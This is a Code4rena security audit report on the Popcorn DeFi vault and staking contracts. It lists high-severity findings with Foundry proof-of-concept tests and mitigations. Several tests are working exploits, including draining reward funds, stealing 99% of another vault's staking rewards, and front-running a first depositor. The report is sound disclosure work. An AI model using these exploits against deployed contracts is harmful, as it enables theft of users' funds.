# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Popcorn smart contract system written in Solidity. The audit took place between January 31â€”February 7 2023.

This audit was judged by [LSDan](https://twitter.com/lsdan_defi).

Final report assembled by [itsmetechjay](https://twitter.com/itsmetechjay).

# Summary

The C4 analysis yielded an aggregated total of 47 unique vulnerabilities. Of these vulnerabilities, 12 received a risk rating in the category of HIGH severity and 35 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 125 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 22 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Popcorn audit repository](https://github.com/code-423n4/2023-01-popcorn), and is composed of 16 smart contracts, 18 interfaces and 1 abstract written in the Solidity programming language and includes 2,694 lines of Solidity code.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (12)
## [[H-01] Any user can drain the entire reward fund in MultiRewardStaking due to incorrect calculation of `supplierDelta`](https://github.com/code-423n4/2023-01-popcorn-findings/issues/791)
*Submitted by [ulqiorra](https://github.com/code-423n4/2023-01-popcorn-findings/issues/791), also found by [joestakey](https://github.com/code-423n4/2023-01-popcorn-findings/issues/815), [0Kage](https://github.com/code-423n4/2023-01-popcorn-findings/issues/410), and [0xMirce](https://github.com/code-423n4/2023-01-popcorn-findings/issues/404)*

<https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L427> 

<https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L274>

### Impact

Reward `deltaIndex` in `_accrueRewards()` is multiplied by `10**decimals()` but eventually divided by `rewards.ONE` (which is equal to `10**IERC20Metadata(address(rewardToken)).decimals()`) in `_accrueUser()`.

If the number of decimals in MultiRewardEscrow share token differs from the number of decimals in the reward token, then all rewards are multipled by `10 ** (decimals() - rewardToken.decimals())`.

Therefore, for example, if an admin adds USDT as the reward token with decimals=6, it will result in the reward for any user to be multiplied by `10**(18-6) = 1000000000000` on the next block. This will at best lead to a DOS where no one will be able to withdraw funds. But at worst, users will drain the entire reward fund due to inflated calculations in the next block.

### Proof of Concept

Put the following test in `./test/` folder and run with `forge test --mc DecimalMismatchTest`. The test fails because of incorrect `supplierDelta` calculations:

```solidity

    stakingToken.approve(address(staking), 1);
    
    vm.prank(bob);
    staking.deposit(1);

    assert (staking.balanceOf(bob) == 1);

    vm.warp(block.timestamp + 1);

    IERC20[] memory a = new IERC20[](1);
    a[0] = IERC20(address(rewardToken));

    vm.prank(bob);

    // 1 second elapsed, so Bob must get a little reward
    // but instead this will REVERT with "ERC20: transfer amount exceeds balance"
    // because the `supplierDelta` is computed incorrect and becomes too large
    staking.claimRewards(bob, a);
  }
}
```

### Recommended Mitigation Steps

Use the same number of decimals when calculating `deltaIndex` and `supplierDelta`.

## [[H-02] `BeefyAdapter()` malicious vault owner can use malicious `\_beefyBooster` to steal the adapter's token](https://github.com/code-423n4/2023-01-popcorn-findings/issues/552)
*Submitted by [bin2chen](https://github.com/code-423n4/2023-01-popcorn-findings/issues/552), also found by [Ch\_301](https://github.com/code-423n4/2023-01-popcorn-findings/issues/628), [rvierdiiev](https://github.com/code-423n4/2023-01-popcorn-findings/issues/451), and [0xTraub](https://github.com/code-423n4/2023-01-popcorn-findings/issues/89)*

Malicious vault owner can use Malicious `\_beefyBooster` to steal the adapter's token.

### Proof of Concept

When creating a BeefyAdapter, the vault owner can specify the `\_beefyBooster`.

The current implementation does not check if the `\_beefyBooster` is legitimate or not, and worse, it `\_beefyVault.approve` to the `\_beefyBooster` during initialization.

The code is as follows:

```solidity
contract BeefyAdapter is AdapterBase, WithRewards {
...
    function initialize(
        bytes memory adapterInitData,
        address registry,
        bytes memory beefyInitData
    ) external initializer {
       
        (address _beefyVault, address _beefyBooster) = abi.decode(
            beefyInitData,   //@audit <--------- beefyInitData comes from the owner's input: adapterData.data
            (address, address)
        );


        //@audit <-------- not check _beefyBooster is legal
        if (
            _beefyBooster != address(0) &&
            IBeefyBooster(_beefyBooster).stakedToken() != _beefyVault  
        ) revert InvalidBeefyBooster(_beefyBooster);   

...
      
        if (_beefyBooster != address(0))
            IERC20(_beefyVault).approve(_beefyBooster, type(uint256).max);     //@audit <---------  _beefyVault approve _beefyBooster    

}

    function _protocolDeposit(uint256 amount, uint256)
        internal
        virtual
        override
    {
        beefyVault.deposit(amount);
        if (address(beefyBooster) != address(0)) 
            beefyBooster.stake(beefyVault.balanceOf(address(this)));  //@audit <--------- A malicious beefyBooster can transfer the token
    }
```

As a result, a malicious user can pass a malicious `\_beefyBooster` contract, and when the user deposits to the vault, the vault is saved to the `\_beefyVault`.

This malicious `\_beefyBooster` can execute `\_beefyVault.transferFrom(BeefyAdapter)`, and take all the tokens stored by the adapter to `\_beefyVault`.

### Recommended Mitigation Steps

Check `\_beefyBooster` just like you check `\_beefyVault`:

```solidity
    function initialize(
        bytes memory adapterInitData,
        address registry,
        bytes memory beefyInitData
    ) external initializer {
...
        if (!IPermissionRegistry(registry).endorsed(_beefyVault))
            revert NotEndorsed(_beefyVault);
...            
+       if (!IPermissionRegistry(registry).endorsed(_beefyBooster))
+           revert NotEndorsed(_beefyBooster);

        if (
            _beefyBooster != address(0) &&
            IBeefyBooster(_beefyBooster).stakedToken() != _beefyVault
        ) revert InvalidBeefyBooster(_beefyBooster);
```

## [[H-03] Incorrect Reward Duration After Change in Reward Speed in MultiRewardStaking](https://github.com/code-423n4/2023-01-popcorn-findings/issues/424)
*Submitted by [waldenyan20](https://github.com/code-423n4/2023-01-popcorn-findings/issues/424), also found by [0xRobocop](https://github.com/code-423n4/2023-01-popcorn-findings/issues/842), [minhtrng](https://github.com/code-423n4/2023-01-popcorn-findings/issues/761), [hansfriese](https://github.com/code-423n4/2023-01-popcorn-findings/issues/624), [KIntern\_NA](https://github.com/code-423n4/2023-01-popcorn-findings/issues/505), [mert\_eren](https://github.com/code-423n4/2023-01-popcorn-findings/issues/489), [peanuts](https://github.com/code-423n4/2023-01-popcorn-findings/issues/339), [cccz](https://github.com/code-423n4/2023-01-popcorn-findings/issues/255), and [Ruhum](https://github.com/code-423n4/2023-01-popcorn-findings/issues/191)*

When the reward speed is changed in `MultiRewardStaking`, the new end time is calculated based off of the balance of the reward token owned by the contract. This, however, is not the same as the number of reward tokens that are left to be distributed since some of those tokens may be owed to users who have not collected their rewards yet. As a result, some users may benefit from earning rewards past the end of the intended reward period, and leaving the contract unable to pay the rewards it owes other users.

### Proof of Concept

A simple Foundry test I wrote demonstrates that the contracts fail to calculate the rewards properly after the reward speed is changed:

```
// SPDX-License-Identifier: GPL-3.0
// Docgen-SOLC: 0.8.15

pragma solidity ^0.8.15;

contract AuditTest is Test {
  using SafeCastLib for uint256;

  MockERC20 rewardToken2;

  IERC20 iRewardToken1;
  IERC20 iRewardToken2;

  MultiRewardStaking staking;
  MultiRewardEscrow escrow;

  address alice = address(0xABCD);
  address bob = address(0xDCBA);
  address feeRecipient = address(0x9999);


  bytes32 constant PERMIT_TYPEHASH =
    keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");

  event RewardInfoUpdate(IERC20 rewardsToken, uint160 rewardsPerSecond, uint32 rewardsEndTimestamp);
  event RewardsClaimed(address indexed user, IERC20 rewardsToken, uint256 amount, bool escrowed);

  function setUp() public {
    vm.label(alice, "alice");
    vm.label(bob, "bob");

    stakingToken = new MockERC20("Staking Token", "STKN", 18);

    rewardToken1 = new MockERC20("RewardsToken1", "RTKN1", 18);
    rewardToken2 = new MockERC20("RewardsToken2", "RTKN2", 18);
    iRewardToken1 = IERC20(address(rewardToken1));
    iRewardToken2 = IERC20(address(rewardToken2));

    escrow = new MultiRewardEscrow(address(this), feeRecipient);

    staking = new MultiRewardStaking();
    staking.initialize(IERC20(address(stakingToken)), IMultiRewardEscrow(address(escrow)), address(this));
  }

  function _addRewardToken(MockERC20 rewardsToken) internal {
    rewardsToken.mint(address(this), 10 ether);
    rewardsToken.approve(address(staking), 10 ether);

    staking.addRewardToken(IERC20(address(rewardsToken)), 0.1 ether, 10 ether, false, 0, 0, 0);
  }

  function test__endtime_after_change_reward_speed() public {
    _addRewardToken(rewardToken1);

    stakingToken.mint(alice, 1 ether);
    stakingToken.mint(bob, 1 ether);

    vm.prank(alice);
    stakingToken.approve(address(staking), 1 ether);
    vm.prank(bob);
    stakingToken.approve(address(staking), 1 ether);

    vm.prank(alice);
    staking.deposit(1 ether);

    // 50% of rewards paid out
    vm.warp(block.timestamp + 50);

    vm.prank(alice);
    staking.withdraw(1 ether);
    assertEq(staking.accruedRewards(alice, iRewardToken1), 5 ether);

    // Double Accrual (from original)
    staking.changeRewardSpeed(iRewardToken1, 0.2 ether); // Twice as fast now

    vm.prank(bob);
    staking.deposit(1 ether);

    // The remaining 50% of rewards paid out
    vm.warp(block.timestamp + 200);

    vm.prank(bob);
    staking.withdraw(1 ether);
    assertEq(staking.accruedRewards(bob, iRewardToken1), 5 ether);
  }

}
```

The output of the test demonstrates an incorrect calculation:

    [FAIL. Reason: Assertion failed.] test__endtime_after_change_reward_speed() (gas: 558909)
    Logs:
      Error: a == b not satisfied [uint]
        Expected: 5000000000000000000
          Actual: 20000000000000000000

    Test result: FAILED. 0 passed; 1 failed; finished in 6.12ms

Notice that the amount of reward tokens given to Bob is more than the amount owned by the contract!

### Tools Used

I reproduced the bug simply by adding a test within the existing Foundry project.

### Recommended Mitigation Steps

There is a nice accounting trick to make sure the remaining time is calculated correctly without needing to keep track of how much you owe to users that has not been paid out yet. I would suggest changing the vulnerable code in `changeRewardSpeed` to:

        uint32 prevEndTime = rewards.rewardsEndTimestamp;

        uint256 remainder = prevEndTime > block.timestamp ? (uint256(prevEndTime) - block.timestamp) * rewards.rewardsPerSecond : 0;

        uint32 rewardsEndTimestamp = _calcRewardsEnd(
          block.timestamp.safeCastTo32(),
          rewardsPerSecond,
          remainder
        );

If ERC777 tokens are used for rewards, the entire balance of rewards in the staking contract can get drained by an attacker.

### Proof of Concept

ERC777 allow users to register a hook to notify them when tokens are transferred to them.

This hook can be used to reenter the contract and drain the rewards.

The issue is in the `claimRewards` in `MultiRewardStaking`.
The function does not follow the checks-effects-interactions pattern and therefore can be reentered when transferring tokens in the for loop. <br><https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L170-L187>

      function claimRewards(address user, IERC20[] memory _rewardTokens) external accrueRewards(msg.sender, user) {
        for (uint8 i; i < _rewardTokens.length; i++) {
          uint256 rewardAmount = accruedRewards[user][_rewardTokens[i]];

          if (rewardAmount == 0) revert ZeroRewards(_rewardTokens[i]);

          EscrowInfo memory escrowInfo = escrowInfos[_rewardTokens[i]];

          if (escrowInfo.escrowPercentage > 0) {
            _lockToken(user, _rewardTokens[i], rewardAmount, escrowInfo);
            emit RewardsClaimed(user, _rewardTokens[i], rewardAmount, true);
          } else {
            _rewardTokens[i].transfer(user, rewardAmount);
            emit RewardsClaimed(user, _rewardTokens[i], rewardAmount, false);
          }

          accruedRewards[user][_rewardTokens[i]] = 0;
        }

As can be seen above, the clearing of the `accruedRewards` is done AFTER the transfer when it should be BEFORE the transfer.

**Foundry POC**

The POC demonstrates an end-to-end attack including a malicious hacker contract that steals the balance of the reward token.

Follow the checks-effects-interactions pattern and clear out `accruedRewards[user][_rewardTokens[i]]` before transferring.

Additionally, it would be a good idea to add a ReentrancyGuard modifier to the function.

## [[H-05] Malicious strategy can lead to loss of funds](https://github.com/code-423n4/2023-01-popcorn-findings/issues/388)
*Submitted by [7siech](https://github.com/code-423n4/2023-01-popcorn-findings/issues/388), also found by [imare](https://github.com/code-423n4/2023-01-popcorn-findings/issues/563) and [fs0c](https://github.com/code-423n4/2023-01-popcorn-findings/issues/475)*

A malicious strategy has access to the adapter's storage and can therefore freely change any values.

### Proof of Concept

Because `AdapterBase` calls the `Strategy` using `delegatecall`, the `Strategy` has access to the calling contract's storage and can be manipulated directly.

In the following proof of concept, a `MaliciousStrategy` is paired with the `BeefyAdapter` and when called will manipulate the `performanceFee` and `highWaterMark` values. Of course, any other storage slots of the adapter could also be manipulated or any other calls to external contracts on behalf of the `msg.sender` could be performed.

### Recommended Mitigation Steps

From chatting with the devs, the goal is to mix and match adapters and strategies. I don't think `delegatecall` should be used and adapters and strategies should be treated as separate contracts. Relevant approvals should be given individually instead.

## [[H-06] Lost Rewards in MultiRewardStaking Upon Third-Party Withdraw](https://github.com/code-423n4/2023-01-popcorn-findings/issues/386)
*Submitted by [waldenyan20](https://github.com/code-423n4/2023-01-popcorn-findings/issues/386), also found by [ulqiorra](https://github.com/code-423n4/2023-01-popcorn-findings/issues/801), [hansfriese](https://github.com/code-423n4/2023-01-popcorn-findings/issues/616), and [KingNFT](https://github.com/code-423n4/2023-01-popcorn-findings/issues/385)*

Affected contract: `MultiRewardStaking`

When assets are withdrawn for user `Alice` by an approved user `Bob` to a receiver that is not `Alice`, the rewards are never accrued and the resulting **staking rewards are lost forever**. This is because `accrueRewards` is called on `caller` and `receiver` but never `owner`.

Third-party withdrawals are allowed by the fact that `withdraw(uint256, address, address)` exists in `ERC4626Upgradeable` and is never overwritten by a method with the same signature. Protocols composing with Popcorn will assume by the nature of this contract being an `ERC4626` that this method is safe to use when it in fact costs the user significantly.

### Proof of Concept

I created a test to reproduce this bug. When I included the below code within `MultiRewardStaking.t.sol` it passed, meaning Alice and Bob both had no rewards to claim by the end:

    function test__withdraw_bug() public {
        // Add a reward token
        _addRewardToken(rewardToken1); // adds at 0.1 per second

        // Make a deposit for Alice
        stakingToken.mint(alice, 1 ether);
        vm.prank(alice);
        stakingToken.approve(address(staking), 1 ether);
        assertEq(stakingToken.allowance(alice, address(staking)), 1 ether);

        assertEq(staking.balanceOf(alice), 0);
        vm.prank(alice);
        staking.deposit(1 ether);
        assertEq(staking.balanceOf(alice), 1 ether);

        // Move 10 seconds into the future
        vm.warp(block.timestamp + 10); // 1 ether should be owed to Alice in rewards

        // Approve Bob for withdrawal
        vm.prank(alice);
        staking.approve(bob, 1 ether);

        // Bob withdraws to himself
        vm.prank(bob);
        staking.withdraw(1 ether, bob, alice);
        assertEq(staking.balanceOf(alice), 0);
        assertEq(stakingToken.balanceOf(bob), 1 ether);

        IERC20[] memory rewardsTokenKeys = new IERC20[](1);
        rewardsTokenKeys[0] = iRewardToken1;

        // Alice has no rewards to claim
        vm.prank(alice);
        vm.expectRevert(abi.encodeWithSelector(MultiRewardStaking.ZeroRewards.selector, iRewardToken1));
        staking.claimRewards(alice, rewardsTokenKeys);

        // Bob has no rewards to claim
        vm.prank(bob);
        vm.expectRevert(abi.encodeWithSelector(MultiRewardStaking.ZeroRewards.selector, iRewardToken1));
        staking.claimRewards(bob, rewardsTokenKeys);
      }

One can similarly create a test that doesn't expect the calls at the end to revert and that test will fail.

### Tools Used

I reproduced the bug simply by adding a test within the existing Foundry project.

### Recommended Mitigation Steps

1.  Fix the code by changing [this line of code](https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L127) in `_withdraw` to instead call `_accrueRewards(owner, receiver)`. It is okay to not accrue the rewards on `caller` since the caller neither gains nor loses staked tokens.

2.  Add a similar test as above in `MultiRewardStaking.t.sol` that **will fail** if Alice is unable to withdraw `1 ether` of rewards in the end.

## [[H-07] Anyone who uses same adapter has the ability to pause it](https://github.com/code-423n4/2023-01-popcorn-findings/issues/292)
*Submitted by [rvierdiiev](https://github.com/code-423n4/2023-01-popcorn-findings/issues/292), also found by [bin2chen](https://github.com/code-423n4/2023-01-popcorn-findings/issues/574)*

<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L605-L615>

<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/adapter/abstracts/AdapterBase.sol#L575>

### Impact

Anyone who uses same adapter has the ability to pause it. As result you have the ability to pause any vault by creating your vault with the same adapter.

When a user creates vault, he has the ability to deploy new adapter or [reuse already created adapter](https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L103-L104).

VaultController gives ability to pause adapter. 

<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L605-L615>

```solidity
  function pauseAdapters(address[] calldata vaults) external {
    uint8 len = uint8(vaults.length);
    for (uint256 i = 0; i < len; i++) {
      _verifyCreatorOrOwner(vaults[i]);
      (bool success, bytes memory returnData) = adminProxy.execute(
        IVault(vaults[i]).adapter(),
        abi.encodeWithSelector(IPausable.pause.selector)
      );
      if (!success) revert UnderlyingError(returnData);
    }
  }
```

As you can see `_verifyCreatorOrOwner` is used to determine if msg.sender can pause adapter. 

<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L667-L670>

```solidity
  function _verifyCreatorOrOwner(address vault) internal returns (VaultMetadata memory metadata) {
    metadata = vaultRegistry.getVault(vault);
    if (msg.sender != metadata.creator || msg.sender != owner) revert NotSubmitterNorOwner(msg.sender);
  }
```

So in case if you are creator of vault that uses adaptor that you want to pause, then you are able to pause it.

This is how it can be used in order to stop the vault.
1. Someone created vault that uses adapterA.
2. Attacker creates own vault and sets adapterA as well.
3. Now attacker is able to pause adapterA and as result it's not possible to deposit anymore. Also vault is not earning fees now, as pausing [withdraws all from strategy](https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/adapter/abstracts/AdapterBase.sol#L575).
4. And it can pause it as many times as he wants (in case if someone else will try to unpause it).

So this attack allows to stop all vaults that use same adapter from earning yields.

### Tools Used

VS Code

### Recommended Mitigation Steps

I think that it's better to create a clone of adapter for the vault, so each vault has separate adapter.

<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultRegistry.sol#L44-L53>

### Impact

Anyone can deploy a Vault with a malicious Staking contract attached. If the Staking contract already exists, we can just pass its address to `deployVault` and no checks will be applied to see whether the Staking contract matches valid Staking templates in the Template Registry.

An attacker can create malicious Staking contract that acts like a regular ERC-4626 vault but with a backdoor function that allows them to withdraw all the deposited funds in the contract. Users may assume the Staking contract is valid and safe and will deposit their funds into it. This will lead to loss of funds for users and huge loss of credibility for the protocol.

### Proof of Concept

The below PoC shows the behavior described above where any Staking contract can be deployed with a Vault. The below lines will need to be added to the `VaultController.t.sol` file.

```solidity

The test can be run with the following command: `forge test --no-match-contract 'Abstract' --match-test test__deploy_malicious_staking_contract`

### Tools Used

VS Code, Foundry

### Recommended Mitigation Steps

Add checks to verify that the Staking contract being used in `deployVault` is a Staking contract that was deployed by the system and uses an approved template:

<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L390-L399>

### Impact

Attacker can steal 99% of the balance of a reward token of any Staking contract in the blockchain. An attacker can do this by modifying the reward speed of the target reward token.

So an attacker gets access to `changeRewardSpeed`, he will need to deploy a vault using the target Staking contract as its Staking contract. Since the Staking contract is now attached to the attacker's created vault, he can now successfully `changeRewardSpeed`. Now with `changeRewardSpeed`, attacker can set the `rewardSpeed` to any absurdly large amount that allows them to drain 99% of the balance (dust usually remains due to rounding issues) after some seconds (12 seconds in the PoC.)

### Proof of Concept

This attack is made possible by the following issues:

1.  Any user can deploy a Vault that uses any existing Staking contract - <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L106-L108>
2.  As long as attacker is creator of a Vault that has the target Staking contract attached to it, attacker can call `changeStakingRewardSpeeds` to modify the rewardSpeeds of any reward tokens in the target Staking contract - <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L495-L501>
3.  There are no checks for limits on the `rewardsPerSecond` value in `changeRewardSpeed` so attacker can set any amount they want - <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L299-L314>
4.  `changeRewardSpeed` also uses `_calcRewardsEnd` to get the new `rewardsEndTimestamp` but that calculation is faulty and the new timestamp is always longer than it's supposed to be leading to people being able to claim more rewards than they should get - <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L351-L360>

Below is the PoC using a Foundry test:

```solidity
  function test__steal_rewards_from_any_staking_contract() public {
    addTemplate("Adapter", templateId, adapterImpl, true, true);
    addTemplate("Strategy", "MockStrategy", strategyImpl, false, true);
    addTemplate("Vault", "V1", vaultImpl, true, true);

    // 1. deploy regular legit vault owned by this
    address vault = deployVault();
    address staking = vaultRegistry.getVault(vault).staking;

    rewardToken.mint(staking, 1_000_000 ether);

    asset.mint(bob, 10000 ether);
    asset.approve(vault, 10000 ether);
    IVault(vault).deposit(10000 ether, bob);
    IVault(vault).approve(staking, 10000 ether);
    IMultiRewardStaking(staking).deposit(9900 ether, bob);
    vm.stopPrank();

    vm.startPrank(alice);
    // 2. deploy attacker-owned vault using the same Staking contract as legit vault
    // alice is the attacker
    address attackerVault = controller.deployVault(
      VaultInitParams({
        asset: iAsset,
        adapter: IERC4626(address(0)),
        fees: VaultFees({
          deposit: 100,
          withdrawal: 200,
          management: 300,
          performance: 400
        }),
        feeRecipient: feeRecipient,
        owner: address(this)
      }),
      DeploymentArgs({ id: templateId, data: abi.encode(uint256(100)) }),
      DeploymentArgs({ id: 0, data: "" }),
      staking,
      "",
      VaultMetadata({
        vault: address(0),
        staking: staking,
        creator: alice,
        metadataCID: metadataCid,
        swapTokenAddresses: swapTokenAddresses,
        swapAddress: address(0x5555),
        exchange: uint256(1)
      }),
      0
    );

    asset.mint(alice, 10 ether);
    asset.approve(vault, 10 ether);
    IVault(vault).deposit(10 ether, alice);
    IVault(vault).approve(staking, 10 ether);
    IMultiRewardStaking(staking).deposit(1 ether, alice);

    address[] memory targets = new address[](1);
    targets[0] = attackerVault;
    IERC20[] memory rewardTokens = new IERC20[](1);
    rewardTokens[0] = iRewardToken;
    uint160[] memory rewardsSpeeds = new uint160[](1);
    rewardsSpeeds[0] = 990_099_990 ether;
    controller.changeStakingRewardsSpeeds(targets, rewardTokens, rewardsSpeeds);

    assertGt(rewardToken.balanceOf(staking), 1_000_000 ether);

    vm.warp(block.timestamp + 12);
    MultiRewardStaking(staking).claimRewards(alice, rewardTokens);

    assertGt(rewardToken.balanceOf(alice), 999_999 ether);
    assertLt(1 ether, rewardToken.balanceOf(staking));
    vm.stopPrank();
  }
```

The PoC shows that the attacker, Alice, can drain any reward token of a Staking contract deployed by a different vault owner. In this test case, Alice does the attack described above stealing a total 999,999 worth of reward tokens (99% of reward tokens owned by the Staking contract.)
Note that the attacker can tweak the amount they stake in the contract, the reward speed they'll use, and the seconds to wait before, before claiming rewards. All of those things have an effect on the cost of the attack and how much can be drained.

The test can be run with:
`forge test --no-match-contract 'Abstract' --match-test test__steal_rewards_from_any_staking_contract`

### Tools Used

VS Code, Foundry

### Recommended Mitigation Steps

1.  Don't allow any Vault creator to use and modify just ANY Staking contract - <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L106-L108>
2.  Add checks to limit how high `rewardsPerSecond` can be when changing rewardSpeed. Maybe make it so that it takes a minimum of 1 month (or some other configurable period) for rewards to be distributed. - <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L299-L314>
3.  Fix calcRewardsEnd to compute the correct rewardsEndTimestamp by taking into account total accrued rewards until that point in time - <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L351-L360>

The first depositor can be front run by an attacker and as a result will lose a considerable part of the assets provided.

The vault calculates the amount of shares to be minted upon deposit to every user via the `convertToShares()` function:

```solidity
function deposit(uint256 assets, address receiver)
    public
    nonReentrant
    whenNotPaused
    syncFeeCheckpoint
    returns (uint256 shares)
{
    if (receiver == address(0)) revert InvalidReceiver();

    uint256 feeShares = convertToShares(
        assets.mulDiv(uint256(fees.deposit), 1e18, Math.Rounding.Down)
    );

    shares = convertToShares(assets) - feeShares;

    if (feeShares > 0) _mint(feeRecipient, feeShares);

    _mint(receiver, shares);

    asset.safeTransferFrom(msg.sender, address(this), assets);

    adapter.deposit(assets, address(this));

    emit Deposit(msg.sender, receiver, assets, shares);
}

function convertToShares(uint256 assets) public view returns (uint256) {
    uint256 supply = totalSupply(); // Saves an extra SLOAD if totalSupply is non-zero.

    return
        supply == 0
            ? assets
            : assets.mulDiv(supply, totalAssets(), Math.Rounding.Down);
}

```

When the pool has no share supply, the amount of shares to be minted is equal to the assets provided. An attacker can abuse this situation and profit off the rounding down operation when calculating the amount of shares if the supply is non-zero. This attack is enabled by the following components: frontrunning, rounding down the amount of shares calculated and regular ERC20 transfers.

### Proof of Concept

The Vault charges zero fees to conduct any action.

*   Alice wants to deposit 2MM USDT to a vault.
*   Bob frontruns Alice deposit() call with the following transactions:
    *   `vault.deposit(1, bob)`: This gives Bob 1 share backed by 1 USDT.
    *   `usdt.transfer(address(vault.adapter()), 1MM)`: Sends 1MM USDT to the underlying vault's adapter (from were the `totalAssets` are calculated)
    *   After those two transactions, `totalAssets = 1MM + 1` and `totalSupply = 1`.
*   Alice deposit transaction is mined: `deposit(2MM, alice)`, she receives only **one** share because:
    *   2MM / (1MM + 1) &ast; totalSupply = 2MM / (1MM + 1) &ast; 1 = 2MM / (1MM+) â‰ˆ 1.999998 = 1 (as Solidity floors down).
*   After Alice tx, the pool now has 3MM assets and distributed 2 shares.
*   Bob backruns Alice's transaction and redeems his share getting 3MM &ast; (1 Share Owned by Bob) / (2 total shares) = 1.5MM

This process gives Bob a â‰ˆ500k asset profit and Alice incurs a â‰ˆ500k loss:

```solidity
  function test__FirstDepositorFrontRun() public {
    uint256 amount = 2_000_000 ether;

    uint256 aliceassetAmount = amount;

    asset.mint(bob, aliceassetAmount);
    asset.mint(alice, aliceassetAmount);

    vm.prank(alice);
    asset.approve(address(vault), aliceassetAmount);
    assertEq(asset.allowance(alice, address(vault)), aliceassetAmount);

    vm.prank(bob);
    asset.approve(address(vault), aliceassetAmount);
    assertEq(asset.allowance(bob, address(vault)), aliceassetAmount);

    uint256 alicePreDepositBal = asset.balanceOf(alice);

    console.log("\n=== INITIAL STATES ===");
    console.log("Bob assets: %s", asset.balanceOf(bob));
    console.log("Alice assets: %s", alicePreDepositBal);

    // Bob frontruns Alice deposit.
    vm.startPrank(bob);
    uint256 bobShareAmount = vault.deposit(1, bob);
    console.log("\n=== BOB DEPOSITS ===");
    console.log("Bob Shares Amount: %s", bobShareAmount);
    console.log("Vault Assets : %s", vault.totalAssets());

    assertTrue(bobShareAmount == 1);
    assertTrue(vault.totalAssets() == 1);
    assertEq(adapter.afterDepositHookCalledCounter(), 1);

    // Bob transfers 1MM of tokens to the adapter
    asset.transfer(address(vault.adapter()), 1_000_000 ether);
    console.log("\n=== AFTER BOB's TRANSFER ===");
    console.log("Bob Shares Amount: %s", bobShareAmount);
    console.log("Vault Assets : %s", vault.totalAssets());
    assertTrue(vault.totalAssets() == 1_000_000 ether + 1);
    vm.stopPrank();

    
    // Alice Txn is mined
    vm.prank(alice);
    uint256 aliceShareAmount = vault.deposit(aliceassetAmount, alice);
    console.log("\n=== AFTER ALICE TX ===");
    console.log("Alice Shares Amount: %s", aliceShareAmount);
    console.log("Vault Assets : %s", vault.totalAssets());
    assertTrue(aliceShareAmount == 1);

    console.log("Convertable assets that Bob receives: %s", vault.convertToAssets(vault.balanceOf(bob)));
    console.log("Convertable assets that Alice receives: %s", vault.convertToAssets(vault.balanceOf(bob)));

    // Bob backruns the call and gets a 500k profit
    vm.prank(bob);
    vault.redeem(bobShareAmount, bob, bob);
    console.log("\n=== BOB WITHDRAWS ===");

    console.log("\n=== ALICE WITHDRAWS ===");
    vm.prank(alice);
    vault.redeem(aliceShareAmount, alice, alice);

    console.log("\n=== FINAL STATES ===");
    console.log("Bob assets: %s", asset.balanceOf(bob));
    console.log("Alice assets: %s", asset.balanceOf(alice));
  }
```

Output:

    === INITIAL STATES ===
      Bob assets: 2000000000000000000000000

      Alice assets: 1500000000000000000000001

This same issue is commonly found in vaults. [Spearbit](https://spearbit.com/) also [reported this](https://github.com/spearbit/portfolio/blob/master/pdfs/MapleV2.pdf) on their Maple V2 audit as the primary high risk issue.

### Recommended Mitigation Steps

*   Require a minimum amount of initial shares (when its supply is zero) to be minted taking into account that:
    *   The deposit mints an effective (INITIAL_MINT - INITIAL_BURN) amount of shares to the first depositor
    *   Burns the INITIAL_BURN amount to a dead address.

Both initial amounts should be set carefully as they partially harm the first depositor. Those amounts should be high enough to reduce the profitability of this attack to the first depositor but not excessively high which could reduce the incentive of being the first depositor.

<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L447-L460>

### Impact

Protocol loses fees because highWaterMark is updated every time someone deposit, withdraw, mint.

### Proof of Concept

This bug is related to the fees accruing design. It was discussed with the sponsor in order to understand how it should work.

Protocol has such thing as performance fee. Actually this is fee from accrued yields. If user deposited X assets and after some time he can withdraw X+Y assets for that minted amount of shares, that means that strategy has earned some Y amount of yields. Then protocol is able to get some part of that Y amount as a performance fee.

